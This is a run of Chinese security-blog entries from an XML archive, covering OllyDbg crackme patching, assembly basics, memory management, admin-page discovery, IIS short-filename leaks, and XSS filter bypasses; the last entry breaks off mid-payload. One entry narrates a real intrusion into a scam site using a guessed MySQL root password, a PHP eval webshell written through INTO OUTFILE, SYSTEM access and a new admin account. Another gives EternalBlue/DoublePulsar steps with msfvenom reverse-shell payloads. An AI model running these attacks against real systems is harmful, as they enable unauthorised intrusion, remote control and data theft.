    <content type="text"><![CDATA[首先来看下TraceMe这个序列号验证程序流程图：程序运行截图：程序流程：用户输入用户名和序列号，程序通过GetDlgItemTextA函数获取到用户输入的内容，然后调用比较序列号的函数判断序列号是否正确，函数会有返回值来表示正确与否。根据返回值来选择弹出正确还是错误的对话框。 使用OllyDebug载入程序：在反汇编窗口中Ctrl+G，查找GetDlgItemTextA函数，如下图所示：然后在该地址处设置断点，重新F9运行到该断点处，程序提示输入用户名和注册号“lzx123,123456”，输入完成之后，一直F8，找到程序将刚才输入的lzx123入栈的地方：edx存放用户名，eax存放注册号。注意，程序将我们输入的用户名和注册号入栈之后，下一步一般就是判断注册号是否合法了，注意下面一个CALL函数，根据上面的汇编代码，大致能够反推出验证函数大致如下：12345int a(注册号,用户名,用户名长度)&#123; ... return;&#125; 本次破解不考虑函数内部，我们只管函数的返回值，程序继续执行，运行到下面的一个跳转语句，如下图所示：由于我们输入的注册码是任意输入的，那个这个跳转按照正常流程，一定是调到错误处理，所以，破解的办法就是不让程序跳转，使用nop指令替换该跳转语句。选中该跳转语句，右键-&gt;二进制-&gt;用nop填充： 然后使用之前的方法，将修改保存到可执行文件就ok了。破解之后，运行效果如下： (注意，跳转语句之前有一条语句：test eax，eax；任何函数执行之后的返回值，都会放在这个寄存器里面，如果返回的内容大于4个字节，那么寄存器会存储返回数据的地址。) 关键代码注释：]]></content>
      <categories>
        <category>软件安全</category>
      </categories>
      <tags>
        <tag>OllyDebug</tag>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[计算机原理&汇编语言复习]]></title>
    <url>%2F2017%2F05%2F01%2F%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%8E%9F%E7%90%86%26%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%A4%8D%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[寄存器EAX：扩展累加寄存器EBX：扩展基址寄存器ECX：扩展计数寄存器EDX：扩展数据寄存器ESI：扩展来源寄存器EDI：扩展目标寄存器EBP：扩展基址指针寄存器ESP：扩展堆栈指针寄存器，指向当前进程的栈空间地址。EIP：扩展指令指针寄存器，指向下一条要被执行的指令。寄存器的大小都是32bit，4个字节。 栈内存中的一部分，具有两个特殊性质： FILO（Fisrt In Last Out，先进后出）； 地址反向增长（栈底为大地址，栈顶为小地址）； 系统APIWindows应用程序运行在Ring3级别，包括OllyDebug。有时候需要Ring0级别才能进行操作，可以通过系统为我们搭建的桥梁：使用API函数来处理，因为系统只信任自己提供的函数，所以我们要通过API才能实现对内核的操作。 标志位在逆向中，需要关心的标志位只有三个，也就是cmp指令能修改的那三个：Z/O/C。Z标志位（0标志），这个标志位是最常用的，运算结果为0时候，Z标志位置1，否则置0。O标志位（溢出标志），在运行过程中，如操作数超出了机器能表示的范围则称为溢出，此时OF位置1，否则置0。C标志位（进位标志），记录运算时从最高有效位产生的进位值。例如执行加法指令时，最高有效位有进位时置1，否则置0。 CALL指令call XXX;等于push EIP; 然后jmp XXX；解释：调用函数的时候，需要先将函数的返回地址进行入栈，然后跳转到子函数处执行，执行完之后建返回地址出栈到EIP。CALL有一下几种方式：call 404000h；直接跳到函数或过程的地址call eax；函数或过程地址存放在eaxcall dword ptr [eax]；首先按照dword类型取出eax寄存器中存放的数值，然后取出该数值对应的地址中的数据。call dword ptr [eax+5]；首先按照dword类型取出eax寄存器中存放的数值，然后取出该数值+5对应的地址中的数据。call dword ptr [&lt;&amp;API&gt;]；执行一个系统API。 mov指令mov指令格式：mov dest, src；将src的内容拷贝到dest。movs/movsb​​/movsw/movsd edi，esi；这些变体按串/字节/字/双字为单位将esi寄存器指向的数据复制到edi寄存器指向的空间。movsx符号位扩展，byte-&gt;word，word-&gt;dword（扩展后高位全用符号位填充），然后实现mov。movzx零扩展，byte-&gt;word，word-&gt;dword（扩展后高位全用0填充），然后实现mov。 cmp指令cmp指令格式：cmp dest, src；cmp指令比较dest和src两个操作数，并通过比较结果设置C/​O/Z标志位。cmp指令大概有以下几种格式：cmp eax,ebx;如果相等，Z标志位置1，否则0。cmp eax, [404000] ;将eax和404000地址处的dword型数据相比较并同上置位。cmp [404000], eax ;同上。 test指令test指令格式：test dest, src这个指令和and指令一样，对两个操作数进行按位的‘与’运算，唯一不同之处是不将‘与’的结果保存到dest。即本指令对两个操作数的内容均不进行修改，仅是在逻辑与操作后，对标志位重新置位。该指令的实战形态百分之九十九是酱紫：test eax, eax（如果eax的值为0，则Z标志位置1）]]></content>
      <categories>
        <category>软件安全</category>
      </categories>
      <tags>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[OllyDebug-修改提示框标题]]></title>
    <url>%2F2017%2F04%2F30%2FOllyDebug-%E4%BF%AE%E6%94%B9%E6%8F%90%E7%A4%BA%E6%A1%86%E6%A0%87%E9%A2%98%2F</url>
    <content type="text"><![CDATA[软件运行效果如下：如上图所示，软件的标题为“I love fishc.com”。使用OllyDebug将标题改为“I love 123456789”！使用OllyDebug打开该程序，一路按F8，程序执行出弹窗，暂停在0X004011CE处，从右边的汇编代码中可以看出程序使用call指令调用了一个子函数：选中该地址，按下F2，在该地址处设置断点重新运行程序，按下F9快捷键快速运行到断点处，然后单步步入进入子函数（快捷键F7）:在上图中的红框在，我们可以看到4条push指令，找到标题的地址为：0X00422030。然后在数据窗口中，使用Ctrl+g，查找该地址，修改数据内容为I love 123456789，注意不要勾选保持大小，修改完之后，需要在末尾加上0x00，字符串结束标志。在数据窗口中任意地方右键-&gt;复制到可执行文件：然后在弹出的窗口中，右键-&gt;备份-&gt;保存数据到文件，给文件重命名之后就ok了。 查找标题的另一种方式：在反汇编窗口中，右键-&gt;中文搜索引擎-&gt;搜索ASCII，程序会跳转到如下窗口：Ctrl+F，搜索“I love fishc.com”，可以定位到指令所在位置，双击改行，跳转到反汇编窗口所在位置。 总结：F7：单步步入，执行到子函数内部F8：单步步过，执行完该行F9：全速运行，知道遇到断点或者程序结束Ctrl+g：打开跟随表达式窗口 程序是调用的MessageBoxA，该方法有四个参数，在调用子函数的时候，会将参数全部入栈。]]></content>
      <categories>
        <category>软件安全</category>
      </categories>
      <tags>
        <tag>OllyDebug</tag>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[软件逆向基础]]></title>
    <url>%2F2017%2F04%2F30%2F%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[调试逆向技术动态分析技术：指的是使用调试工具加载程序并运行。随着程序运行，调试者可以随时中断目标的指令流程，以便观察相关计算的结果和当前的设备情况。静态分析技术：是相对于动态分析而言的。由于在实际分析中，很多场合不方便运行目标（例如病毒程序，设备不兼容，软件的单独某一模块）。那么这个时候静态分析技术就该上场了！ 反编译汇编语言还原成高级语言。通常不能把可执行文件变成高级语言源代码，只能转换成汇编语言。语言越高级，反编译的难度就越大。 反汇编机器指令还原成汇编代码。 常用逆向工具Ollydbg、 Windbg、 SoftICE、IDA、 PEiD、 W32Dasm、 C32asm等等。Ollydbg、 Windbg是动态分析调试器，但Ollydbg不能调试内核，所以是工作在ring3层。IDA是很强大的静态反汇编工具，虽然功能强大，但是操作很复杂。 栈的原理从计算机科学的角度来看，栈是一种数据结构，它的存储规则是先进后出。栈结构在计算机中是一片连续的存储空间，且是向下生长的，即由大向小排列。系统中通过两个寄存器来表示一个堆栈。 esp和ebp， esp是栈顶寄存器，ebp是栈底寄存器。栈的操作：push和pop，push是压入操作，pop是弹出操作。 函数调用过程参数入栈：将参数按照调用约定依次入栈。返回地址入栈：将当前代码区调用指令的下一条指令地址压入栈，供函数返回时继续使用。代码区跳转：从当前代码区跳转到被调用函数的入口处。栈帧调整：保存当前栈帧的状态值，已备后面恢复本栈帧时使用。将当前的栈帧切换到新的栈帧。给新栈帧分配空间。 下面是_stdcall调用约定的一个函数调用的例子：push 参数3；push 参数2；push 参数1；call 函数地址；这里call指令将完成两个工作：1.返回地址入栈2.跳转到被调用的函数地址。push ebp；保存旧栈帧的底部mov ebp，esp；设置新栈帧的底部sub esp，xxx；为新的栈开辟空间 函数返回的过程：1.保存返回值：通常将函数的返回值保存在eax寄存器中。2.弹出当前栈帧，返回下一个栈帧。在堆栈平衡的基础上，给esp加上栈帧的大小，降低栈顶，回收当前栈帧的空间。将当前栈帧底部保存的前栈帧ebp值弹入ebp寄存器，恢复出上一个栈帧。将函数返回地址弹给eip寄存器。3.跳转：按照函数返回地址跳回母函数中继续执行。 函数返回时的关键序列：add esp，xxx；降低栈顶，回收当前的栈帧pop ebp；将上一个栈帧底部恢复到ebpretn；这条指令有两个功能： 1.弹出栈帧中的返回地址，完成栈帧的恢复工作。 2.跳回弹出的返回地址，继续下面的执行。 函数参数入栈顺序： 下面用一个实际的例子来介绍函数的调用：123456789101112131415161718int fun_b(int b1,intb2)&#123; int b3; b3=b1+b2; return b3;&#125;int fun_a(int a1,int a2)&#123; int a3,a4; a3=a1-a2; a4=fun_b(a1,a2); return a3*a4;&#125;void main()&#123; int m_main; m_main=fun_a(1,2);&#125; 编译方式的识别VCVC的编译方式有Debug和Release方式。Debug：通常称为调试版本，它包含调试信息，并且不作任何优化，便于程序员调试程序。Release：称为发布版本，它往往是进行了各种优化，使得程序在代码大小和运行速度上都是最优的，以便用户很好地使用。Debug版与Release版的区别：1.Debug版会初始化内存为CC，而Release版不会。2.Debug版会使用一个检查堆栈平衡的函数checkesp，而Release版不需要。 数组的识别数组是相同数据类型的数据集合，以线性方式存储在内存中。其数据排列顺序是由低到高，数组的名称表示该数组的首地址。 流程控制语句的识别if语句先进行比较指令，再通过条件跳转命令来执行。；先执行各类影响标志位的指令，如cmp；其后是各种跳转指令jxx xxxx if…else语句先进行比较指令，然后判断条件跳转到if的分支代码处，执行完成后采用无条件跳转指令（ jmp）跳转到else分支的结束代码处。 switch语句先进行比较指令，然后执行跳转，但与if的多分支语句的区别是： switch语句将比较指令放在一起，后面的case模块是放在一起的。；获取switch中考察的变量值；先执行各类影响标志位的指令，如cmpjxx xxx1；先执行各类影响标志位的指令，如cmpjxx xxx2；先执行各类影响标志位的指令，如cmpjxx xxx3xxx1:……jmp endxxx2:……jmp endxxx3:……jmp end while语句先进行判断，成功则进行循环体执行，否则跳出循环。while_begin:；影响标志位的指令jxx while_end……jmp while_beginwhile_end: 常见的汇编指令介绍cmp a,b；比较a与bmov a,b；把b值送给a值，使a=bret；返回主程序nop；无作用call；调用子程序，子程序以ret结尾je或jz；相等则跳（机器码是74或84）jne或jnz；不相等则跳（机器码是75或85）jmp；无条件跳（机器码是EB）jb；若小于则跳ja；若大于则跳jg；若大于则跳jge；若大于等于则跳jl；若小于则跳pop xxx；出栈push xxx；压栈]]></content>
      <categories>
        <category>软件安全</category>
      </categories>
      <tags>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[操作系统的内存管理]]></title>
    <url>%2F2017%2F04%2F29%2F%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%2F</url>
    <content type="text"><![CDATA[内存管理子系统是操作系统最重要的部分之一。从早期计算开始，系统的内存大小就难以满足人们的需要。为了解决这个问题，可利用虚拟内存。虚拟内存通过当需要时在竞争的进程之间共享内存，使系统显得有比实际上更多的内存空间。虚拟内存不仅仅使机器上的内存变多，内存管理子系统还提供以下功能： 大地址空间操作系统使系统显得它有比实际上大得多的内存。虚拟内存可以比系统中的物理内存大许多倍。 保护系统中每个进程有自己的虚拟地址空间。这些虚拟地址空间相互之间完全分离，所以运行一个应用的进程不能影响其他的进程。同样，硬件的虚拟内存机制允许内存区域被写保护。这样保护了代码和数据不被恶意应用重写。 内存映射内存映射用来把映像和数据文件映像到一个进程的地址空间。在内存映射中，文件的内容被直接链接到进程的虚拟地址空间。 公平物理内存分配内存管理子系统给予系统中运行的每个进程公平的一份系统物理内存。 共享虚拟内存尽管虚拟内存允许进程拥有分隔的(虚拟)地址空间，有时你会需要进程共享内存。例如系统中可能会有几个进程运行命令解释shell bash。最好是在物理内存中只有一份bash拷贝，所有运行bash的进程共享它；而不是有几份bash拷贝，每个进程虚拟空间一个。动态库是另一个常见的几个进程共享执行代码的例子。 Linux操作系统的存储管理Linux进程采用动态地址映射方式，进程的地址空间和存储空间的对应关系是在程序的执行过程中实现的。进程使用的是虚拟地址，因此，他对每个地址的访问都需要通过MMU把虚拟地址转换为内存的物理地址。Linux操作系统采用了请求式分页虚拟存储管理方法。系统为每个进程提供了4GB的虚拟内存空间。各个进程的虚拟内存彼此独立。其中0-3GB为用户空间，用户态进程可以直接访问此空间。3-4GB为内核空间，存放内核访问的代码和数据，用户进程不能直接访问，用户进程只能通过中断或者系统调用进入内核态时才有权访问。在Linux系统中，内核空间一直处于当前状态并且在所有进程中映射到相同的物理内存。Linux的存储管理主要是管理进程虚拟内存的用户区。进程虚拟内存的用户区分为：代码段、数据段、堆栈，以及进程运行的环境变量、参数传递区域等。虚拟内存的空间，进程使用多少，操作系统就会分配多少，并且将这些虚拟地址映射到物理地址，没有使用的地址保留。蓝色区域代表已经映射物理内存的虚拟地址，白色区域为没映射部分。在上面的例子中，Firefox由于他的巨大的内存需求，已经使用了他的大部分虚拟地址空间。地址空间中不同的带对应内存段如堆、栈等等。 栈：进程地址空间中最上面的段为栈，很多语言中栈用于存储本地变量和函数参数。调用一个方法或函数时压入栈一个新的栈帧。当函数返回时，这个压入的栈帧被释放。这个简单的设个，可能是因为数据遵循严格的FIFO次序，这意味着再复杂的数据结构都无需跟踪栈内容——一个简单的栈顶指针将会做跟踪作用。这样入栈和出栈非常快速和准确。进一步，堆栈地区不断重用，往往在CPU缓存中持有活跃的栈内存，加快存取。进程中的每个线程获得他自己的栈。BSS段、数据段和代码段：BSS段和数据段在C语言中存储静态和全局变量。不同的是BSS段存放的是没有被初始化的静态变量，也就是所这些静态变量在源代码中没有被程序员设置初值。BSS内存区是匿名的：他不映射任何特定的文件。 Window操作系统的内存管理Window也为每个进程分配了4GB的虚拟地址空间，让每个进程都认为自己拥有4GB的内存空间，32位CPU可以取地址的空间为2的32次方，就是4GB（正如16位CPU有20根寻址线所有拥有2的20次方的寻址空间一样）。当我们在Windows中运行一个程序之后，系统会为该应用程序创建一个进程，Windows使得每个进程都拥有2GB的地址空间，这2GB地址空间用于程序存放代码，数据，堆栈，自由存储区（堆），另外2GB用于共享系统使用。上图中，最左边的地址都是虚拟地址。虚拟空间只是Windows为该进程分配的一个虚拟的地址空间，只有当其和物理内存相关联后才有意义。]]></content>
      <categories>
        <category>嵌入式</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Window</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[OllyDebug-工具介绍]]></title>
    <url>%2F2017%2F04%2F29%2FOllyDebug%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8D%2F</url>
    <content type="text"><![CDATA[工具介绍OD，软件名称，反汇编工具OD=OllyDebug，一个新的动态追踪工具，将IDA与SoftICE结合起来的思想，Ring 3 级的调试器。OllyDebug的使用界面是可视化操作，但是非常的占内存。 窗口介绍反汇编窗口：显示被调试程序的反汇编代码，标题栏上的地址、HEX数据、反汇编、注释可以通过在窗口中右击出现的菜单：界面选项-&gt;隐藏标题，或“显示标题”来进行切换是否显示。用鼠标左键点击注释标签可以切换注释显示的方式。寄存器窗口：显示当前所选线程的 CPU 寄存器内容。同样点击标签“寄存器(FPU)”可以切换显示寄存器的方式。信息窗口：显示反汇编窗口中选中的第一个命令的参数及一些跳转目标地址、字串等。数据窗口：显示内存或文件的内容。右键菜单可用于切换显示方式。堆栈窗口：显示当前线程的堆栈。 常用按钮介绍鼠标停留在按钮上，软件左下方会有功能介绍。从左至右，功能依次为：重新运行程序；关闭程序；运行程序；暂停执行；单步步入；单步步过；跟踪步入；跟踪步过；执行到返回；转到反汇编窗口中的地址； l：显示记录窗口e：显示模块窗口m：显示内存窗口t：显示线程w：显示窗口h：显示句柄c：显示CPUp：显示补丁k：显示堆栈b：显示断点r：显示参考s：显示源码 插件功能介绍BP：快捷断点选项P ：方便记录的小公举VB：适用于VB程序的断点Notepad：记事本Calc：计算器Folder：打开文件位置CMD：命令行 常用快捷键Ctrl+F2:重启程序。Alt+F2:关闭被调试程序。F3:弹出“打开32位.EXE文件”对话框。Alt+F5:让OllyDbg置顶。（此按键可反向执行）。 F7:单步步入到下一条命令，如果当前命令是一个函数［Call］，则会停在这个函数体的第一条命令上。 Shift+F7:与F7相同，但是如果被调试程序发生异常而中止。Ctrl+F7:自动步入，在所有的函数调用中一条一条地执行命令（类似一直按着F7）。 F8:单步步过到下一条命令。 Shift+F8:与F8相同，但是如果被调试程序发生异常而中止，OD会首先尝试步过被调试程序指定的异常处理。Ctrl+F8:自动步过，一条一条的执行命令，但并不进入函数调用内部。 F9:让程序继续执行。设置断点之后，按F9会全速执行到断点处。 Shift+F9:与F9相同，但是如果被调试程序发生异常而中止，调试器会首先尝试执行被调试程序指定的异常处理。Ctrl+F9:执行直到返回，跟踪程序直到遇到返回，在此期间不进入子函数也不更新CPU数据。Alt+F9:执行直到返回到用户代码段，跟踪程序直到指令所属于的模块不在系统目录中。Ctrl+F11:Run跟踪步入，一条一条执行命令，进入每个子函数调用，并把寄存器的信息加入到Run跟踪的存储数据中。F12:停止程序执行，同时暂停被调试程序的所有线程。F2：设置断点，只要在光标定位的位置按F2键即可，再按一次F2键则会删除断点。F4：运行到选定位置。作用就是直接运行到光标所在位置处暂停。ALT+F9：执行到用户代码。可用于从系统领空快速返回到我们调试的程序领空。]]></content>
      <categories>
        <category>软件安全</category>
      </categories>
      <tags>
        <tag>OllyDebug</tag>
        <tag>逆向</tag>
        <tag>工具</tag>
        <tag>汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[实战入侵刷单网站]]></title>
    <url>%2F2017%2F04%2F27%2F%E5%AE%9E%E6%88%98%E5%85%A5%E4%BE%B5%E5%88%B7%E5%8D%95%E7%BD%91%E7%AB%99%2F</url>
    <content type="text"><![CDATA[前段时间有看到过LOL小智的粉丝因为兼职刷单被骗的消息，下午比较闲，正好群里有骗子在发刷单的兼职，决定尝试搞一波。果断加骗子好友，首先发了一份工作流程介绍文章给我，让我了解下工作流程，然后让填一份入职申请表，想不到骗子还有这些入职流程，也难怪一些安全意识不高的朋友能够被骗。用假的身份填完之后，就开始刷单任务了，骗子发来了链接，获取到了目标地址，然后随便找个理由结束聊天。首先打开Awvs扫描器扫一波，发现网站无法访问了，网站安装了防火墙，封了我ip，骗子安全意识还挺高，换个ip继续。不能扫漏洞，扫下端口总可以吧，Nmap扫描发现开放了3306和3389。尝试连接下数据库，账号：root，密码：**（网站域名），卧槽，竟然登录成功了，打开煤气点支烟，平静一下激动的心情。看了下注册用户信息，找了下管理员账号密码，但是没找到后台，尝试直接写入一句话木马，现在已经对用户信息不感冒了。写入一句话木马需要知道网站的绝对路径，现在只能靠猜了，首先1select @@basedir; 查看下数据库的安装路径：我一拍大腿，发现网站管理员竟然是用的phpstudy搭建的网站，因为我最开始学渗透时就是使用phpstudy搭建的测试环境，所以有点喜出望外，赶紧准备写入一句话木马：1select '&lt;?php @eval($_POST["lzx"]);?&gt;' into outfile 'C:/phpStudy/WWW/1.php'; 没想到管理员并没有将网站放在phpstudy默认的WWW目录下，木马写入失败，于是开始各种尝试：1234select '&lt;?php @eval($_POST["lzx"]);?&gt;' into outfile 'C:/phpStudy/WWWROOT/1.php';select '&lt;?php @eval($_POST["lzx"]);?&gt;' into outfile 'D:/1.php';select '&lt;?php @eval($_POST["lzx"]);?&gt;' into outfile 'C:/www/1.php';... 最终还是让我找到了网站的绝对路径“C:/www/www.网站域名.com/”，成功写入一句话：菜刀连接之：上传大马：访问大马：获取系统system权限：下一步就是添加管理员账号，3389远程桌面连接了，但是在大马中执行net命令报错，暂时还没有找到解决办法。入侵到此为止，后续找到突破办法之后再更新。 总结一下：MySQL数据库拿到访问权之后的一些信息收集语句：12345678910显示版本：select version();显示字符集：select @@character_set_database;显示数据库show databases;显示表名：show tables;显示计算机名：select @@hostname;显示系统版本：select @@version_compile_os;显示mysql路径：select @@basedir;显示数据库路径：select @@datadir;显示root密码：select User,Password from mysql.user;开启外连：GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY '123456' WITH GRANT OPTION; 与同事交流之后，原来是使用net命名添加管理员时，密码设置的过于简单，服务器又配置了密码策略，所以换个复杂点的密码就添加成功了。]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Shadowbroker工具使用方法]]></title>
    <url>%2F2017%2F04%2F26%2FShadowbroker%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[运行环境准备 安装Python2.6和pywin32，注意Python2.6必须为32位版本； 在windows利用工具目录下创建listeningposts目录； 使用Python2.6运行fb.py； 注意事项多使用help命令查看帮助；工具使用期间，关闭本机的杀毒软件。 运行FuzzBunch框架的执行，首先需要配置各个全局变量： 目标ip地址； 本机ip地址； 指示转发选项是否将被使用； 指定log日志目录； 选择或者创建项目；配置完成之后，进入fb框架，使用help查看帮助命令：use命令的用途是选择插件，如下图所示：插件被分为如下几类：Exploit，渗透攻击插件：Touch，目标识别插件：Payload，攻击载荷插件：还有几类插件未列出。 目标系统漏洞探测使用Smbtouch插件，使用smb协议来检测对方操作系统版本、架构和可利用的漏洞。fb &gt; use Smbtouch 使用插件fb Touch (Smbtouch) &gt; execute 执行插件 攻击使用Eternalblue插件：fb Touch (Smbtouch) &gt; use Eternalblue确定相关的变量，目标ip、端口等：攻击成功之后会在系统安装一个BackDoor，光有一个后面还不能执行系统命令，需要配合另一个插件。 后渗透攻击攻击成功之后就可以开始使用DoublePulsar插件，DoublePulsar类似于一个注入器，有以下几个功能，使用该插件ping功能探测目标系统版本：准备注入dll payload：使用kali生成dll木马：X64：1msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.114 LPORT=8089 -f dll &gt; /root/Desktop/1.dll X86：1msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.114 LPORT=8089 -f dll &gt; /root/Desktop/1.dll Kali端开启监听：1234567$ msfconsole msf &gt; use exploit/multi/handler msf &gt; set LHOST 192.168.1.114 msf &gt; set LPORT 8089 msf &gt; set PAYLOAD windows/meterpreter/reverse_tcp（msf &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp） msf &gt; exploit 将dll拷贝到攻击机，使用fb.py加载，执行成功之后，kali中会得到一个meterpreter。截屏，看看朋友在做什么：]]></content>
      <categories>
        <category>系统安全</category>
      </categories>
      <tags>
        <tag>工具</tag>
        <tag>主机</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[顶级域名、二级域名和三级域名如何区分]]></title>
    <url>%2F2017%2F04%2F26%2F%E9%A1%B6%E7%BA%A7%E5%9F%9F%E5%90%8D%E3%80%81%E4%BA%8C%E7%BA%A7%E5%9F%9F%E5%90%8D%E5%92%8C%E4%B8%89%E7%BA%A7%E5%9F%9F%E5%90%8D%E5%A6%82%E4%BD%95%E5%8C%BA%E5%88%86%2F</url>
    <content type="text"><![CDATA[域名的构成以一个常见的域名为例说明，baidu网址是由二部分组成，标号“baidu”是这个域名的主体，而最后的标号“com”则是该域名的后缀，代表的这是一个com国际域名，是顶级域名。而前面的www.是网络名，为www的域名。DNS规定，域名中的标号都由英文字母和数字组成，每一个标号不超过63个字符，也不区分大小写字母。标号中除连字符（-）外不能使用其他的标点符号。级别最低的域名写在最左边，而级别最高的域名写在最右边。由多个标号组成的完整域名总共不超过255个字符。近年来，一些国家也纷纷开发使用采用本民族语言构成的域名，如德语，法语等。 域名的基本类型一是国际域名（international top-level domain-names，简称 iTDs），也叫国际顶级域名。这也是使用最早也最广泛的域名。例如表示工商企业的.com，表示网络提供商的.net，表示非盈利组织的.org等。二是国内域名，又称为国内顶级域名（national top-level domainnames，简称 nTLDs），即按照国家的不同分配不同后缀，这些域名即为该国的国内顶级域名。目前200多个国家和地区都按照ISO3166国家代码分配了顶级域名，例如中国是 cn，美国是us，日本是 jp等。 在实际使用和功能上，国际域名与国内域名没有任何区别，都是互联网上的具有唯一性的标识。只是在最终管理机构上，国际域名由美国商业部授权的互联网名称与数字地址分配机构（The Internet Corporation for Assigned Names and Numbers）即ICANN 负责注册和管理；而国内域名则由中国互联网络管理中心 （China Internet Network Information Center) 即CNNIC 负责注册和管理。 域名级别域名可分为不同级别，包括顶级域名、二级域名等。(1) 顶级域名顶级域名又分为两类：一是国家顶级域名（national top-level domainnames，简称 nTLDs），目前 200 多个国家都按照ISO3166国家代码分配了顶级域名，例如中国是 cn，美国是us，日本是 jp等；二是国际顶级域名（international top-level domain names，简称iTDs），例如表示工商企业的 .Com，表示网络提供商的.net，表示非盈利组织的.org 等。目前大多数域名争议都发生在 com 的顶级域名下，因为多数公司上网的目的都是为了赢利。为加强域名管理，解决域名资源的紧张，Internet协会、Internet 分址机构及世界知识产权组织（WIPO）等国际组织经过广泛协商，在原来三个国际通用顶级域名：（com）的基础上，新增加了7 个国际通用顶级域名：firm（公司企业）、store（销售公司或企业）、Web（突出WWW活动的单位）、arts（突出文化、娱乐活动的单位）、rec (突出消遣、娱乐活动的单位)、info (提供信息服务的单位)、nom(个人)，并在世界范围内选择新的注册机构来受理域名注册申请。(2) 二级域名二级域名是指顶级域名之下的域名，在国际顶级域名下，它是指域名注册人的网上名称，例如 ibm，yahoo，microsoft等；在国家顶级域名下，它是表示注册企业类别的符号，例如com，edu，gov，net等。]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[网站后台查找]]></title>
    <url>%2F2017%2F04%2F26%2F%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E6%9F%A5%E6%89%BE%2F</url>
    <content type="text"><![CDATA[扫描工具扫描，御剑等；（和字典大小有关） Awvs等扫描器网站目录结构爬行； 搜索引擎，google hacking；相关语法： inurl:xxx 搜索url地址中带有xxx的地址； intext:xxx 网站内容中带有xxx的链接； site:xxx 搜索包含关键词的站点； filetype:xxx 搜索包含xxx的文件类型； Intitle:xxx 标题带有xxx；实例： a.谷歌黑客 site:xxxx.com inurl:admin； site:xxxx.com inurl:login； site:xxxx.com intext:管理； site:xxxx.com admin(login，管理员登陆，后台，中心，登陆，登录，管理中心) 常用后台地址：/admin//admin.asp(jsp,php)/admin/login.asp(jsp,php)/manage 基于上传问题的后台探测：查看网站图片，其中目录很可能包含管理目录，这里查看要多在几个地方查看，首页，新闻中心，就是查看的图片要有不同上传点上传的图片，如果图片保存路径在后台的下级目录，那么这种方法屡试不爽。 查看源代码：很多首页源码里就有定义后台路径。]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[IIS短文件名泄露的另类利用]]></title>
    <url>%2F2017%2F04%2F26%2FIIS%E7%9F%AD%E6%96%87%E4%BB%B6%E5%90%8D%E6%B3%84%E9%9C%B2%E7%9A%84%E5%8F%A6%E7%B1%BB%E5%88%A9%E7%94%A8%2F</url>
    <content type="text"><![CDATA[下载数据库如果网站存在IIS短文件名漏洞，可以使用泄露的信息，暴力猜解出数据库文件进行下载，或者是查找网站后台地址。真实的路径：dz/data/backup_20170401.sql短文件名泄露的路径：dz/data/backup~1.sql在知道文件后面的字符为日期的情况下，可以使用burp暴力猜解出文件名，进而下载sql文件。跑出数据库名：百度查出管理员常用的数据库名为：%#@$@#FDS@#$%%#.mdb 下载网站备份文件如果网站存在IIS短文件名泄露漏洞，可以探测下网站根目录是否有“.rar”或者其他格式的压缩文件，如果有，很有可能是网站的源代码，下载网站源码压缩包，查找数据库连接文件，或者进行代码审计。然后使用Burp Suite爆破出文件名，下载压缩文件。]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>IIS</tag>
        <tag>中间件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS跨站脚本漏洞总结]]></title>
    <url>%2F2017%2F04%2F26%2FXSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[概念跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。 分类反射型（非持续型）：一次攻击，将修改好的链接发送给目标用户，让客户点击，达到攻击用户的目的，只能一次性，通过参数提交的方式。存储型（持续型）：攻击过后，效果会一直存在，直到攻击被删除。比如一条腾讯新闻，将攻击代码插入在评论区，那么后面的用户都可能触发这个xss攻击。，可能是一张图片，用户一旦点击就会访问另一个地址，也许不用点击，只要访问就会触发。存储型危害特别大，特别是社交网站。如果一篇日志，里面有xss攻击代码，很多然转载阅读之后都可能会被盗取cookie。 XSS绕过技术a.无任何过滤的情况：测试语句：1&lt;script&gt;alert(1)&lt;/script&gt; b.过滤””、””等标签的情况：源代码：12$name = preg_replace(“&lt;script&gt;”,””,$name);$name = preg_replace(“&lt;/script&gt;”,””,$name); 大小写绕过：1&lt;scriPt&gt;alert(1)&lt;/scRipt&gt; c.过滤””、””等标签，并且考虑大小写的情况：源代码：12$name = preg_replace(“&lt;script&gt;/i”,””,$name);$name = preg_replace(“&lt;/script&gt;/i”,””,$name); 测试语句：12&lt;BODY onload="alert(1)"&gt;，&lt;img 